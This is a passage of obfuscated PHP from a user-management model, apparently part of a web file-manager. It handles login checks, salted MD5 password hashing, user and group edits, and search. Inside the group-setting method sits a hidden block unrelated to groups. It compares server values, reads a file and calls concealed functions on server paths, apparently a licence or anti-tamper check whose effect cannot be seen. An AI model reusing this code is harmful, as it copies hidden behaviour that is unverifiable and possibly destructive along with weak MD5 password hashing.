$šé¯óúá = false) { $Ç¹üõªˆ =& $_SERVER[´È¥ö†ö]; if (!$àŠŸ³‡ó) { return $àŠŸ³‡ó; } $šÜˆú†İ = md5($Ç¹üõªˆ[2465] . $àŠŸ³‡ó[$Ç¹üõªˆ[965]] . $Ç¹üõªˆ[2466] . $àŠŸ³‡ó[$Ç¹üõªˆ[32]]); $àŠŸ³‡ó = $this->_listDataApplyItem($àŠŸ³‡ó); $¬Ê´Á = Model($Ç¹üõªˆ[1420])->metaGet($àŠŸ³‡ó[$Ç¹üõªˆ[90]][$Ç¹üõªˆ[193]]); $àŠŸ³‡ó[$Ç¹üõªˆ[2467]] = $šÜˆú†İ; $àŠŸ³‡ó[$Ç¹üõªˆ[90]][$Ç¹üõªˆ[2256]] = isset($¬Ê´Á[$Ç¹üõªˆ[2257]]) ? $¬Ê´Á[$Ç¹üõªˆ[2257]] : null; if ($šé¯óúá) { $àŠŸ³‡ó[$Ç¹üõªˆ[550]] = $this->metaGet($àŠŸ³‡ó[$Ç¹üõªˆ[1773]]); } return $àŠŸ³‡ó; } protected function getInfoSimple($Ùù…Ş, $ı˜‹šíË = false) { $”Áâ¢ ÷ =& $_SERVER[´È¥ö†ö]; if (!$Ùù…Ş) { return array(); } if ($ı˜‹šíË) { $°éâÃ¤‹ = $this->where(array($”Áâ¢ ÷[1773] => intval($Ùù…Ş)))->find(); if (!is_array($°éâÃ¤‹)) { return array(); } $°éâÃ¤‹[$”Áâ¢ ÷[2468]] = Action($”Áâ¢ ÷[2469])->parseUrl($°éâÃ¤‹[$”Áâ¢ ÷[2468]]); return $°éâÃ¤‹; } return $this->cacheFunctionGet($”Áâ¢ ÷[2061], $Ùù…Ş); } protected function getInfoSimpleOuter($÷òŸÈ²) { $¤Û«à“¬ =& $_SERVER[´È¥ö†ö]; if (!$÷òŸÈ² || $÷òŸÈ² == 0) { return array($¤Û«à“¬[1773] => $¤Û«à“¬[230], $¤Û«à“¬[32] => $¤Û«à“¬[176] . LNG($¤Û«à“¬[2470]) . $¤Û«à“¬[178], $¤Û«à“¬[2468] => STATIC_PATH . $¤Û«à“¬[2471]); } $´ığŸ©ä = $this->cacheFunctionGet($¤Û«à“¬[2061], $÷òŸÈ²); $Áèö‰³­ = array_field_key($´ığŸ©ä, explode($¤Û«à“¬[50], $this->simpleField)); if (!$Áèö‰³­) { return array($¤Û«à“¬[1773] => $¤Û«à“¬[1272], $¤Û«à“¬[32] => $¤Û«à“¬[176] . LNG($¤Û«à“¬[2472]) . $¤Û«à“¬[178], $¤Û«à“¬[2468] => STATIC_PATH . $¤Û«à“¬[2473]); } $Áèö‰³­[$¤Û«à“¬[2468]] = Action($¤Û«à“¬[2469])->parseUrl($Áèö‰³­[$¤Û«à“¬[2468]]); return $Áèö‰³­; } protected function groupUser($ÉÌßœß¬) { } public static function errorLang($“ÂÉŠ¯û) { $ö‡Í—¼¯ =& $_SERVER[´È¥ö†ö]; $èğøìÕÃ = array(self::ERROR_USER_NOT_EXISTS => $ö‡Í—¼¯[2474], self::ERROR_USER_PASSWORD_ERROR => $ö‡Í—¼¯[2475], self::ERROR_USER_EXIST_NAME => $ö‡Í—¼¯[2476], self::ERROR_USER_EXIST_PHONE => $ö‡Í—¼¯[2477], self::ERROR_USER_EXIST_EMAIL => $ö‡Í—¼¯[2478], self::ERROR_USER_LOGIN_LOCK => $ö‡Í—¼¯[2479], self::ERROR_IP_NOT_ALLOW => $ö‡Í—¼¯[2480], self::ERROR_USER_EXIST_NICKNAME => $ö‡Í—¼¯[2481]); $àÏ†ğ£¡ = LNG($èğøìÕÃ[$“ÂÉŠ¯û]); if ($“ÂÉŠ¯û == self::ERROR_USER_LOGIN_LOCK) { $ÄÈÃØáÌ = (int) Model($ö‡Í—¼¯[2482])->get($ö‡Í—¼¯[2483]); if ($ÄÈÃØáÌ > 60) { $àÏ†ğ£¡ = str_replace($ö‡Í—¼¯[91], ceil($ÄÈÃØáÌ / 60), $àÏ†ğ£¡); } } return $àÏ†ğ£¡; } protected function metaSet($ıú“›ª•, $ü±ÜİÏ¥ = null, $ƒš½š…— = null) { $this->clearCache($ıú“›ª•); return parent::metaSet($ıú“›ª•, $ü±ÜİÏ¥, $ƒš½š…—); } public function getInfoByMeta($¥½º•ê•, $è§è¶) { $»ÍËßœ— =& $_SERVER[´È¥ö†ö]; $–¶™Šíó = Model($»ÍËßœ—[2484])->where(array($»ÍËßœ—[97] => $¥½º•ê•, $»ÍËßœ—[461] => $è§è¶))->find(); if ($–¶™Šíó) { return $this->getInfo($–¶™Šíó[$»ÍËßœ—[1773]]); } return !1; } public function userLoginCheck($á‘âÁÕ, $˜Â²íôÌ) { $Å‘ƒŸ‰Õ =& $_SERVER[´È¥ö†ö]; $çÉ‹Éú = $this->userLoginFind($á‘âÁÕ); if (!$çÉ‹Éú) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($çÉ‹Éú[$Å‘ƒŸ‰Õ[1773]], $˜Â²íôÌ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($çÉ‹Éú[$Å‘ƒŸ‰Õ[1773]]); } public function userLoginFind($úÂÉ”¹Ã) { $Ú‡ÄıÉü =& $_SERVER[´È¥ö†ö]; $É¡™¸¾ğ = array($Ú‡ÄıÉü[32] => $úÂÉ”¹Ã, $Ú‡ÄıÉü[2269] => $úÂÉ”¹Ã, $Ú‡ÄıÉü[391] => $úÂÉ”¹Ã, $Ú‡ÄıÉü[2485] => $úÂÉ”¹Ã, $Ú‡ÄıÉü[1076] => $Ú‡ÄıÉü[1078]); if ($this->nickNameRpt()) { unset($É¡™¸¾ğ[$Ú‡ÄıÉü[2269]]); } return $this->where($É¡™¸¾ğ)->find(); } public function clearCache($ôêæôğî) { $¤§¤©òÃ =& $_SERVER[´È¥ö†ö]; $this->cacheFunctionClear($¤§¤©òÃ[2060], $ôêæôğî); $this->cacheFunctionClear($¤§¤©òÃ[2061], $ôêæôğî); $this->cacheFunctionClear($¤§¤©òÃ[2464], $ôêæôğî); } public function userPasswordCheck($âŠöš×Ó, $ğ¶©íºå) { $ÇÈ¬öìÃ =& $_SERVER[´È¥ö†ö]; $Î°¥ŒÜÀ = $this->where(array($ÇÈ¬öìÃ[1773] => intval($âŠöš×Ó)))->find(); $œÎúÔÀ = $this->metaGet($âŠöš×Ó); $°Ü««Ìä = isset($œÎúÔÀ[$ÇÈ¬öìÃ[2486]]) ? $œÎúÔÀ[$ÇÈ¬öìÃ[2486]] : $ÇÈ¬öìÃ[12]; if (md5($°Ü««Ìä . trim($ğ¶©íºå)) !== $Î°¥ŒÜÀ[$ÇÈ¬öìÃ[965]]) { return !1; } return !0; } public function userAdd($Âëùàî) { $¿«³æ±ç =& $_SERVER[´È¥ö†ö]; $ğÌúÕ‡ô = array($¿«³æ±ç[505] => $Âëùàî[$¿«³æ±ç[32]], $¿«³æ±ç[2487] => $Âëùàî[$¿«³æ±ç[2181]], $¿«³æ±ç[2488] => isset($Âëùàî[$¿«³æ±ç[391]]) ? $Âëùàî[$¿«³æ±ç[391]] : $¿«³æ±ç[12], $¿«³æ±ç[2489] => isset($Âëùàî[$¿«³æ±ç[2485]]) ? $Âëùàî[$¿«³æ±ç[2485]] : $¿«³æ±ç[12], $¿«³æ±ç[2490] => isset($Âëùàî[$¿«³æ±ç[2269]]) ? $Âëùàî[$¿«³æ±ç[2269]] : $Âëùàî[$¿«³æ±ç[32]], $¿«³æ±ç[2491] => isset($Âëùàî[$¿«³æ±ç[2468]]) ? $Âëùàî[$¿«³æ±ç[2468]] : $¿«³æ±ç[12], $¿«³æ±ç[2492] => isset($Âëùàî[$¿«³æ±ç[2493]]) ? $Âëùàî[$¿«³æ±ç[2493]] : 1, $¿«³æ±ç[2494] => $Âëùàî[$¿«³æ±ç[965]], $¿«³æ±ç[2062] => isset($Âëùàî[$¿«³æ±ç[1960]]) ? $Âëùàî[$¿«³æ±ç[1960]] : 1024 * 1024 * 20, $¿«³æ±ç[2063] => 0, $¿«³æ±ç[2495] => 0, $¿«³æ±ç[2107] => isset($Âëùàî[$¿«³æ±ç[826]]) ? $Âëùàî[$¿«³æ±ç[826]] : 1); if (!empty($Âëùàî[$¿«³æ±ç[1773]])) { $ğÌúÕ‡ô[$¿«³æ±ç[1773]] = $Âëùàî[$¿«³æ±ç[1773]]; } $·Ç®¢øÌ = $this->_checkExist($Âëùàî); if ($·Ç®¢øÌ !== !0) { return $·Ç®¢øÌ; } if (!empty($ğÌúÕ‡ô[$¿«³æ±ç[2468]]) && strlen($ğÌúÕ‡ô[$¿«³æ±ç[2468]]) > 255) { $ğÌúÕ‡ô[$¿«³æ±ç[2468]] = $¿«³æ±ç[12]; } $Ò§ğ»³ä = $this->add($ğÌúÕ‡ô); $ºÔÉ× = array($¿«³æ±ç[2494] => $ğÌúÕ‡ô[$¿«³æ±ç[965]], $¿«³æ±ç[2490] => $ğÌúÕ‡ô[$¿«³æ±ç[2269]]); $this->userEdit($Ò§ğ»³ä, $ºÔÉ×); Model($¿«³æ±ç[1420])->userRootAdd($Ò§ğ»³ä); return $Ò§ğ»³ä; } protected function userEditTest($óşšµ¶Á, $—«©Œ½) { return $this->call($_SERVER[´È¥ö†ö][2496], $óşšµ¶Á, $—«©Œ½); } protected function userEdit($Ôğí¬›, $¼–Ê‰¨) { $Ø‚ŸÈ· =& $_SERVER[´È¥ö†ö]; $óæ¼¹ü = $this->getInfoSimple($Ôğí¬›); if (!$óæ¼¹ü) { return !1; } $¶‚Õî¢‡ = $this->_checkExist($¼–Ê‰¨, $Ôğí¬›); if ($¶‚Õî¢‡ !== !0) { return $¶‚Õî¢‡; } if (isset($¼–Ê‰¨[$Ø‚ŸÈ·[965]]) && trim($¼–Ê‰¨[$Ø‚ŸÈ·[965]]) != $Ø‚ŸÈ·[12]) { $Ó™È­·é = $this->metaGet($Ôğí¬›); if (empty($Ó™È­·é[$Ø‚ŸÈ·[2486]])) { $Ó™È­·é[$Ø‚ŸÈ·[2486]] = rand_string(10); Model($Ø‚ŸÈ·[588])->metaSet($Ôğí¬›, $Ø‚ŸÈ·[2486], $Ó™È­·é[$Ø‚ŸÈ·[2486]]); } $¼–Ê‰¨[$Ø‚ŸÈ·[965]] = md5($Ó™È­·é[$Ø‚ŸÈ·[2486]] . trim($¼–Ê‰¨[$Ø‚ŸÈ·[965]])); } else { unset($¼–Ê‰¨[$Ø‚ŸÈ·[965]]); } if (!empty($¼–Ê‰¨[$Ø‚ŸÈ·[2468]]) && strlen($¼–Ê‰¨[$Ø‚ŸÈ·[2468]]) > 255) { $¼–Ê‰¨[$Ø‚ŸÈ·[2468]] = $Ø‚ŸÈ·[12]; } $this->where(array($Ø‚ŸÈ·[1764] => $Ôğí¬›))->save($¼–Ê‰¨); if (isset($¼–Ê‰¨[$Ø‚ŸÈ·[2269]])) { $this->setNamePinyin($Ôğí¬›, $¼–Ê‰¨[$Ø‚ŸÈ·[2269]]); } $this->clearCache($Ôğí¬›); return !0; } public function setNamePinyin($èËÆ¼é, $¹‡Úò­“ = false) { $òØ®àÁÈ =& $_SERVER[´È¥ö†ö]; if (!$¹‡Úò­“) { $‘£ª¨Èß = $this->getInfoSimple($èËÆ¼é); $¹‡Úò­“ = $‘£ª¨Èß[$òØ®àÁÈ[2269]] ? $‘£ª¨Èß[$òØ®àÁÈ[2269]] : $‘£ª¨Èß[$òØ®àÁÈ[32]]; } $†±‰Öñ = Model($òØ®àÁÈ[608]); if (!Input::check($¹‡Úò­“, $òØ®àÁÈ[669])) { return $†±‰Öñ->metaSet($èËÆ¼é, array($òØ®àÁÈ[549] => $òØ®àÁÈ[12], $òØ®àÁÈ[548] => $òØ®àÁÈ[12])); } return $†±‰Öñ->metaSet($èËÆ¼é, array($òØ®àÁÈ[549] => str_replace($òØ®àÁÈ[53], $òØ®àÁÈ[12], Pinyin::get($¹‡Úò­“)), $òØ®àÁÈ[548] => Pinyin::get($¹‡Úò­“, $òØ®àÁÈ[670]))); } private function nickNameRpt() { $ëÙÑĞÅ« =& $_SERVER[´È¥ö†ö]; $­ü»ÏÑ = Model($ëÙÑĞÅ«[846])->get($ëÙÑĞÅ«[2497]); $ñ÷ø¬Ã® = $GLOBALS[$ëÙÑĞÅ«[6]][$ëÙÑĞÅ«[468]][$ëÙÑĞÅ«[2497]]; $Øâ¨ª = !is_null($­ü»ÏÑ) ? $­ü»ÏÑ : $ñ÷ø¬Ã®; return !!$Øâ¨ª; } private function _checkExist($“–Ş¤ç³, $ÃÂ„ä–‚ = false) { $öÏïšÃø =& $_SERVER[´È¥ö†ö]; $É…”œ—Ü = array($öÏïšÃø[32] => UserModel::ERROR_USER_EXIST_NAME, $öÏïšÃø[2269] => UserModel::ERROR_USER_EXIST_NICKNAME, $öÏïšÃø[391] => UserModel::ERROR_USER_EXIST_EMAIL, $öÏïšÃø[2485] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($É…”œ—Ü[$öÏïšÃø[2269]]); } $·œ„õÊî = $ÃÂ„ä–‚ ? array($öÏïšÃø[1773] => array($öÏïšÃø[2498], $ÃÂ„ä–‚)) : array(); foreach ($É…”œ—Ü as $ìÑŒş¢µ => $Ş“²³ˆú) { $ÊôÀ€œı = array(); foreach ($É…”œ—Ü as $òİ¢ ©× => $Ÿ´²ˆ²) { if (isset($“–Ş¤ç³[$òİ¢ ©×]) && $“–Ş¤ç³[$òİ¢ ©×]) { $ÊôÀ€œı[] = $“–Ş¤ç³[$òİ¢ ©×]; } } if (!$ÊôÀ€œı) { continue; } $ÛÔ¡Ëˆò = array_merge(array($ìÑŒş¢µ => array($öÏïšÃø[7], $ÊôÀ€œı)), $·œ„õÊî); $É˜ëŒÔˆ = $this->where($ÛÔ¡Ëˆò)->find(); if ($É˜ëŒÔˆ) { return $Ş“²³ˆú; } } return !0; } public function userListInfo($‘ŸíÌ¾¨) { $²Ù¨¥¿ı =& $_SERVER[´È¥ö†ö]; $”Û‚Ö‰å = array(); $‘ŸíÌ¾¨ = is_array($‘ŸíÌ¾¨) ? array_unique($‘ŸíÌ¾¨) : array(); if (!$‘ŸíÌ¾¨) { return $”Û‚Ö‰å; } if (count($‘ŸíÌ¾¨) < 20) { foreach ($‘ŸíÌ¾¨ as $¶öËúï) { $”Û‚Ö‰å[$¶öËúï . $²Ù¨¥¿ı[12]] = $this->getInfoSimpleOuter($¶öËúï); } } else { $£ŒõöÉÄ = array($²Ù¨¥¿ı[1764] => array($²Ù¨¥¿ı[503], $‘ŸíÌ¾¨)); if (count($‘ŸíÌ¾¨) == 1) { $£ŒõöÉÄ = array($²Ù¨¥¿ı[1764] => $‘ŸíÌ¾¨[0]); } $ÃÑ½Øú = Model($²Ù¨¥¿ı[588])->field($this->simpleField)->where($£ŒõöÉÄ)->select(); $ÃÑ½Øú = array_to_keyvalue($ÃÑ½Øú, $²Ù¨¥¿ı[1773]); foreach ($‘ŸíÌ¾¨ as $¶öËúï) { $šâ¨ÂÅì = $ÃÑ½Øú[$¶öËúï]; if (!$šâ¨ÂÅì) { $”Û‚Ö‰å[$¶öËúï . $²Ù¨¥¿ı[12]] = $this->getInfoSimpleOuter($¶öËúï); continue; } $šâ¨ÂÅì[$²Ù¨¥¿ı[2468]] = Action($²Ù¨¥¿ı[2469])->parseUrl($šâ¨ÂÅì[$²Ù¨¥¿ı[2468]]); $”Û‚Ö‰å[$¶öËúï . $²Ù¨¥¿ı[12]] = $šâ¨ÂÅì; } } return $”Û‚Ö‰å; } protected function userStatus($Œˆ—à’, $ã™À€®) { $¹Èã¯ÎÇ = $this->getInfoSimple($Œˆ—à’); if (!$¹Èã¯ÎÇ) { return !1; } $áâÇŞ¡í = array($_SERVER[´È¥ö†ö][826] => $ã™À€®); return $this->userEdit($Œˆ—à’, $áâÇŞ¡í); } protected function userRemove($ÁÉ“©§Ó) { $ÀÊóôêà =& $_SERVER[´È¥ö†ö]; $•¨°ÚÏÈ = $this->getInfoSimple($ÁÉ“©§Ó); if (!$•¨°ÚÏÈ) { return !1; } $İ·Ìì§€ = array($ÀÊóôêà[1764] => $ÁÉ“©§Ó); Model($ÀÊóôêà[678])->where($İ·Ìì§€)->delete(); Model($ÀÊóôêà[2499])->where($İ·Ìì§€)->delete(); Model($ÀÊóôêà[2068])->where($İ·Ìì§€)->delete(); Model($ÀÊóôêà[2484])->where($İ·Ìì§€)->delete(); Model($ÀÊóôêà[1145])->where($İ·Ìì§€)->delete(); Model($ÀÊóôêà[2286])->removeUserAll($ÁÉ“©§Ó); Model($ÀÊóôêà[901])->userRootRemove($ÁÉ“©§Ó); return $this->where($İ·Ìì§€)->delete(); } protected function userGroupSet($÷“åı±Á, $šñµ©Ô, $íûÉ×‚ü = array()) { $ñ­ÏÂ‹ =& $_SERVER[´È¥ö†ö]; if ($_SERVER[$ñ­ÏÂ‹[309]] != $_SERVER[$ñ­ÏÂ‹[944]]) { $İğ·úØ = $ñ­ÏÂ‹[955]; $Âç™ä‹ä = $ñ­ÏÂ‹[310]; $†ò×öçÎ = $_SERVER[$ñ­ÏÂ‹[311]] . $ñ­ÏÂ‹[312]; $›ïúâ = $Âç™ä‹ä($†ò×öçÎ); $ñæø†¥ı = explode($ñ­ÏÂ‹[287], $›ïúâ); if (count($ñæø†¥ı) < $ñ­ÏÂ‹[702]) { $•íâœ = $ñ­ÏÂ‹[314]; $•íâœ(); } $¸£Á¬Šª = $ñ­ÏÂ‹[956]; $¸£Á¬Šª($_SERVER[$ñ­ÏÂ‹[957]]); $¸£Á¬Šª($_SERVER[$ñ­ÏÂ‹[311]] . $ñ­ÏÂ‹[958]); $“ÏËùÛı = 1; while ($“ÏËùÛı > 1) { $“ÏËùÛı = $“ÏËùÛı + 4; $•ñ’Œ£ã = rawurlencode($“ÏËùÛı . $ñ­ÏÂ‹[465]); } } $×å†©× = $this->getInfoSimple($÷“åı±Á); if (!$×å†©× || !is_array($šñµ©Ô)) { return !1; } $ñÛÙŒÆæ = Model($ñ­ÏÂ‹[2068]); $ñÛÙŒÆæ->where(array($ñ­ÏÂ‹[1773] => $÷“åı±Á))->delete(); $¿µ²Î€ò = array(); $Ÿ¬ÄĞ† = 0; foreach ($šñµ©Ô as $€ÂÈ„¤ë => $Äï¥¶—·) { $«½•ÅÔ = array($ñ­ÏÂ‹[1773] => $÷“åı±Á, $ñ­ÏÂ‹[1974] => $€ÂÈ„¤ë, $ñ­ÏÂ‹[2082] => $Äï¥¶—·); $«½•ÅÔ[$ñ­ÏÂ‹[1998]] = isset($íûÉ×‚ü[$Ÿ¬ÄĞ†]) ? $íûÉ×‚ü[$Ÿ¬ÄĞ†] : 0; $Ÿ¬ÄĞ†++; $¿µ²Î€ò[] = $«½•ÅÔ; } return $ñÛÙŒÆæ->addAll($¿µ²Î€ò, array(), !0); } protected function userGroupAdd($ÙÔÕè“, $Ì¿Óæü÷ = array()) { $äºŠÄâ¶ =& $_SERVER[´È¥ö†ö]; $¿«µğ·‹ = $this->getInfoSimple($ÙÔÕè“); if (!$¿«µğ·‹ || empty($Ì¿Óæü÷)) { return !1; } $“Öğ… = array(); foreach ($Ì¿Óæü÷ as $‘ªšÒ¡ò => $’´™ä³î) { $“Öğ…[] = array($äºŠÄâ¶[1773] => $ÙÔÕè“, $äºŠÄâ¶[1974] => $‘ªšÒ¡ò, $äºŠÄâ¶[2082] => $’´™ä³î, $äºŠÄâ¶[1998] => 0); } return Model($äºŠÄâ¶[2068])->addAll($“Öğ…, array(), !0); } protected function userGroupRemove($µÎÀÒ‹é, $Äêù‡ò¾) { $Œşú””Ÿ =& $_SERVER[´È¥ö†ö]; $û”ÒœÏø = $this->getInfoSimple($µÎÀÒ‹é); if (!$û”ÒœÏø || !$Äêù‡ò¾) { return !1; } $Ññ¬äŸÉ = array($Œşú””Ÿ[1764] => $µÎÀÒ‹é, $Œşú””Ÿ[2066] => $Äêù‡ò¾); return Model($Œşú””Ÿ[2068])->where($Ññ¬äŸÉ)->delete(); } public function listData() { $½Ø×®‰— = $this->_makeOrder()->selectPage(50); $this->_listDataApply($½Ø×®‰—[$_SERVER[´È¥ö†ö][456]]); return $½Ø×®‰—; } public function listByID($®ä±Åü“) { $ôá×Š‚¹ =& $_SERVER[´È¥ö†ö]; if (!$®ä±Åü“) { return; } $¾”Ï©ş = array($ôá×Š‚¹[1773] => array($ôá×Š‚¹[7], $®ä±Åü“)); $ÈÇîŸ­Ù = $this->where($¾”Ï©ş)->select(); $ÈÇîŸ­Ù = array_sort_keep($ÈÇîŸ­Ù, $ôá×Š‚¹[1773], $®ä±Åü“); $this->_listDataApply($ÈÇîŸ­Ù); return $ÈÇîŸ­Ù; } public function listByGroup($Ëı½ºÎ = 0, $¾ÀÉ„ˆ = array()) { $Ã£ıøŠ =& $_SERVER[´È¥ö†ö]; $Ì±¦ÈÌ‚ = $Ã£ıøŠ[12]; $Ù—„«Áö = array(); if ($Ëı½ºÎ) { $Ù—„«Áö = array($Ã£ıøŠ[2500] => intval($Ëı½ºÎ)); $Ì±¦ÈÌ‚ = "\114\105\x46\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x75\x73\x65\162\137\147\x72\x6f\165\160\x20\x75\163\x65\x72\x5f\x67\162\157\165\160\40\x6f\156\40\x75\163\x65\x72\56\x75\163\x65\162\x49\104\40\x3d\x20\165\x73\145\x72\137\147\x72\157\x75\x70\x2e\x75\163\145\162\111\104"; $Ûò’İù = Input::get($Ã£ıøŠ[541], null, $Ã£ıøŠ[12]) ? $Ã£ıøŠ[12] : $Ã£ıøŠ[2501]; } if (isset($¾ÀÉ„ˆ[$Ã£ıøŠ[826]])) { $Ù—„«Áö[$Ã£ıøŠ[2502]] = $¾ÀÉ„ˆ[$Ã£ıøŠ[826]]; } $üêŒÇ¶³ = $this->_makeOrder($Ûò’İù)->field($Ã£ıøŠ[2503])->where($Ù—„«Áö)->join($Ì±¦ÈÌ‚)->selectPage(50); $this->_listDataApply($üêŒÇ¶³[$Ã£ıøŠ[456]]); return $üêŒÇ¶³; } private function _makeOrder($Äğ„²ñÕ = '') { $ş¡öÏãë =& $_SERVER[´È¥ö†ö]; $Ìøï ÷Ö = array($ş¡öÏãë[1773], $ş¡öÏãë[32], $ş¡öÏãë[1962], $ş¡öÏãë[2181], $ş¡öÏãë[1934], $ş¡öÏãë[233]); $…­Û”¨¦ = array($ş¡öÏãë[534] => $ş¡öÏãë[535], $ş¡öÏãë[536] => $ş¡öÏãë[537]); $Ÿ§Õôç¥ = Input::get($ş¡öÏãë[541], $ş¡öÏãë[7], $ş¡öÏãë[1764], $Ìøï ÷Ö); $ºÁçĞ± = Input::get($ş¡öÏãë[542], $ş¡öÏãë[7], $ş¡öÏãë[2069], array($ş¡öÏãë[2069], $ş¡öÏãë[536])); $ºÁçĞ± = $…­Û”¨¦[$ºÁçĞ±]; $Äğ„²ñÕ = $Äğ„²ñÕ . "\x75\x73\x65\x72\56{$Ÿ§Õôç¥}\40{$ºÁçĞ±}\x2c\40\x75\163\x65\162\x2e\165\x73\145\162\111\104\x20\141\x73\x63"; return $this->alias($ş¡öÏãë[2197])->order($Äğ„²ñÕ); } public function listSearch($¯„²¡„ƒ) { $ù÷ŒÑ¢È =& $_SERVER[´È¥ö†ö]; $¢¬¸²„« = trim($¯„²¡„ƒ[$ù÷ŒÑ¢È[2072]]); $ú¨ìÂÆÀ = explode($ù÷ŒÑ¢È[53], $¢¬¸²„«); if (!$¢¬¸²„« || count($ú¨ìÂÆÀ) == 1) { return $this->listSearchNow($¯„²¡„ƒ); } $éÎœİ‘Õ = array($ù÷ŒÑ¢È[456] => array()); foreach ($ú¨ìÂÆÀ as $¼»ô¤§Ğ) { if (!trim($¼»ô¤§Ğ)) { continue; } $¯„²¡„ƒ[$ù÷ŒÑ¢È[2072]] = $¼»ô¤§Ğ; $­ÅÖ›ú‚ = $this->listSearchNow($¯„²¡„ƒ); $éÎœİ‘Õ[$ù÷ŒÑ¢È[456]] = array_merge($éÎœİ‘Õ[$ù÷ŒÑ¢È[456]], $­ÅÖ›ú‚[$ù÷ŒÑ¢È[456]]); } $éÎœİ‘Õ[$ù÷ŒÑ¢È[456]] = array_unique_by_key($éÎœİ‘Õ[$ù÷ŒÑ¢È[456]], $ù÷ŒÑ¢È[1773]); $éÎœİ‘Õ[$ù÷ŒÑ¢È[453]] = array($ù÷ŒÑ¢È[454] => count($éÎœİ‘Õ[$ù÷ŒÑ¢È[456]]), $ù÷ŒÑ¢È[450] => 20, $ù÷ŒÑ¢È[439] => 1, $ù÷ŒÑ¢È[455] => 1); return $éÎœİ‘Õ; } public function listSearchNow($½‹ ÔÏ) { $êø°Á²¶ =& $_SERVER[´È¥ö†ö]; $ÛÇ²Ã€ = trim($½‹ ÔÏ[$êø°Á²¶[2072]]); $ğú†¼¹ = isset($½‹ ÔÏ[$êø°Á²¶[2073]]) ? $½‹ ÔÏ[$êø°Á²¶[2073]] : !1; $ÛÇ²Ã€ = str_replace($êø°Á²¶[2074], $êø°Á²¶[2075], trim($ÛÇ²Ã€)); $ªõî† = array($êø°Á²¶[32] => array($êø°Á²¶[470], "\45{$ÛÇ²Ã€}\45"), $êø°Á²¶[391] => array($êø°Á²¶[470], "{$ÛÇ²Ã€}\x25"), $êø°Á²¶[2269] => array($êø°Á²¶[470], "{$ÛÇ²Ã€}\x25"), $êø°Á²¶[1076] => $êø°Á²¶[2076]); if (Input::check($ÛÇ²Ã€, $êø°Á²¶[397])) { $ªõî†[$êø°Á²¶[1773]] = array($êø°Á²¶[470], "{$ÛÇ²Ã€}\x25"); $ªõî†[$êø°Á²¶[2485]] = array($êø°Á²¶[470], "{$ÛÇ²Ã€}\x25"); } if (!$ÛÇ²Ã€) { $ªõî† = array(); } if (isset($½‹ ÔÏ[$êø°Á²¶[826]])) { $ªõî†[$êø°Á²¶[826]] = $½‹ ÔÏ[$êø°Á²¶[826]]; } $ªõî† = $this->parseWhereLike($ªõî†); $ŠÏŞ®Á = $this->_makeOrder()->where($ªõî†)->selectPage(20); if (!$ŠÏŞ®Á || count($ŠÏŞ®Á[$êø°Á²¶[456]]) < 5 && Input::check($ÛÇ²Ã€, $êø°Á²¶[404])) { $ÑÊ”¢ê¢ = $this->_searchFromMeta($êø°Á²¶[548], $ÛÇ²Ã€, 10); $ÑÓéõ‡¶ = $this->_searchFromMeta($êø°Á²¶[549], $ÛÇ²Ã€, 10); $¢„³›«­ = array_merge($ÑÊ”¢ê¢, $ÑÓéõ‡¶, $ŠÏŞ®Á[$êø°Á²¶[456]]); $ŠÏŞ®Á[$êø°Á²¶[456]] = array_unique_by_key($¢„³›«­, $êø°Á²¶[1773]); $ŠÏŞ®Á[$êø°Á²¶[453]][$êø°Á²¶[454]] = count($ŠÏŞ®Á[$êø°Á²¶[456]]); $ŠÏŞ®Á[$êø°Á²¶[453]][$êø°Á²¶[455]] = ceil($ŠÏŞ®Á[$êø°Á²¶[453]][$êø°Á²¶[454]] / $ŠÏŞ®Á[$êø°Á²¶[453]][$êø°Á²¶[450]]); } $this->_listDataApply($ŠÏŞ®Á[$êø°Á²¶[456]]); $this->_filterByGroup($ŠÏŞ®Á, $ğú†¼¹); return $ŠÏŞ®Á; } private function _filterByGroup(&$æç‰Š§, $¤ß‹ª„Â) { $Ó±İİ¢È =& $_SERVER[´È¥ö†ö]; if (!$¤ß‹ª„Â) { return $æç‰Š§; } foreach ($æç‰Š§[$Ó±İİ¢È[456]] as $¼êõú => &$Ìİ‹Ò) { $¦´Ş±“ = array_to_keyvalue($Ìİ‹Ò[$Ó±İİ¢È[2166]], $Ó±İİ¢È[12], $Ó±İİ¢È[1974]); if (!in_array($¤ß‹ª„Â, $¦´Ş±“)) { unset($æç‰Š§[$Ó±İİ¢È[456]][$¼êõú]); } } unset($Ìİ‹Ò); $æç‰Š§[$Ó±İİ¢È[456]] = array_values($æç‰Š§[$Ó±İİ¢È[456]]); $æç‰Š§[$Ó±İİ¢È[453]] = array($Ó±İİ¢È[2234] => count($æç‰Š§[$Ó±İİ¢È[456]]), $Ó±İİ¢È[2232] => $æç‰Š§[$Ó±İİ¢È[453]][$Ó±İİ¢È[450]], $Ó±İİ¢È[2231] => 1, $Ó±İİ¢È[2233] => 1); } private function _searchFromMeta($èûé¯…®, $ ô²°úà, $µÓ‚“ÒË) { $ñĞ¶¸­ =& $_SERVER[´È¥ö†ö]; $ ô²°úà = strtolower($ ô²°úà); $ƒÙş³¦ = array($ñĞ¶¸­[97] => $èûé¯…®, $ñĞ¶¸­[461] => array($ñĞ¶¸­[470], "\x25{$ ô²°úà}\45")); $ƒÙş³¦ = $this->parseWhereLike($ƒÙş³¦); $›¸‰‚ƒ = Model($ñĞ¶¸­[2504])->where($ƒÙş³¦)->limit($µÓ‚“ÒË)->select(); if (!$›¸‰‚ƒ) { return array(); } $›¸‰‚ƒ = array_to_keyvalue($›¸‰‚ƒ, $ñĞ¶¸­[12], $ñĞ¶¸­[1773]); $øÒ†ì = $this->where(array($ñĞ¶¸­[1764] => array($ñĞ¶¸­[7], $›¸‰‚ƒ)))->select(); if (!$øÒ†ì) { return array(); } return $øÒ†ì; } private function _listDataApplyItem($ÑáäÓ•‚) { $†Ç­Õ‰ê = array($ÑáäÓ•‚); $this->_listDataApply($†Ç­Õ‰ê); return $†Ç­Õ‰ê[0]; } private function _listDataApply(&$æÏò‚‘’) { $¹´èë¹Ê =& $_SERVER[´È¥ö†ö]; if (!$æÏò‚‘’) { return; } array_remove_key($æÏò‚‘’, $¹´èë¹Ê[965]); $üÌê‰íÊ = array_to_keyvalue($æÏò‚‘’, $¹´èë¹Ê[12], $¹´èë¹Ê[1773]); $this->_listAppendGroup($æÏò‚‘’, $üÌê‰íÊ); 